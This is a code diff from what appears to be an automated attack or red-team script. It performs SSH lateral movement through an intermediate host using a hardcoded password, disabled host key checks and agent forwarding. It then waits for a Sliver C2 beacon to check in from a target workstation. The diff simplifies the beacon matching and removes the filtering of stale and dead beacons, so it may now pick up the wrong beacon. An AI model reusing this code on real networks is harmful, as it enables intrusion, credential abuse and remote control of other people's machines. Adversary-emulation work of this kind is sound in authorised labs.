@@ -128,7 +128,7 @@ except:
             "sshpass -p 'VinzenzAdmin!2026' ssh -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null "
             "vinzenz.fedora@10.30.0.8 "
             "\"ssh -A -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null "
-            "vinzenz.fedora@10.40.0.2 'sleep 90'\""
+            "vinzenz.fedora@10.40.0.2 'sleep 20'\""
         )
         subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
@@ -167,53 +167,17 @@ except:
     # ------------------------------------------------------------------
     log("[*] Phase 5: Waiting for Vinzenz workstation Sliver beacon to check in...")
     
-    # Snapshot active beacons before check-in to avoid matching stale/dead beacons
-    from advanced_initial_access import _SESSION_HEADER_RE
-    before_ids = set()
-    output_before = _list_sliver("beacons")
-    saw_header = False
-    for line in output_before.splitlines():
-        if _SESSION_HEADER_RE.search(line):
-            saw_header = True
-            continue
-        if not saw_header:
-            continue
-        stripped = line.strip()
-        if not stripped:
-            continue
-        if set(stripped) <= set("= "):
-            continue
-        before_ids.add(stripped.split()[0])
-
     # Wait for the beacon to check in
     vinzenz_beacon_id = None
     for attempt in range(12):
         time.sleep(5)
         output = _list_sliver("beacons")
-        
-        saw_header = False
-        for line in output.splitlines():
-            if _SESSION_HEADER_RE.search(line):
-                saw_header = True
-                continue
-            if not saw_header:
-                continue
-            stripped = line.strip()
-            if not stripped:
-                continue
-            if set(stripped) <= set("= "):
-                continue
-            if "[DEAD]" in stripped or "[KILLED]" in stripped:
-                continue
-                
-            parts = stripped.split()
-            b_id = parts[0]
-            # Match new beacons only, filtered by name or target IP
-            if b_id not in before_ids and ("vinzenz" in line.lower() or target_ip in line):
-                vinzenz_beacon_id = b_id
+        if "vinzenz" in output.lower() or target_ip in output:
+            for line in output.splitlines():
+                if target_ip in line or "vinzenz" in line.lower():
+                    vinzenz_beacon_id = line.strip().split()[0]
+            if vinzenz_beacon_id:
                 break
-        if vinzenz_beacon_id:
-            break
                 
     if vinzenz_beacon_id:
         log(f"[+] Advanced Lateral Movement successful! Sliver Beacon ID: {vinzenz_beacon_id}")
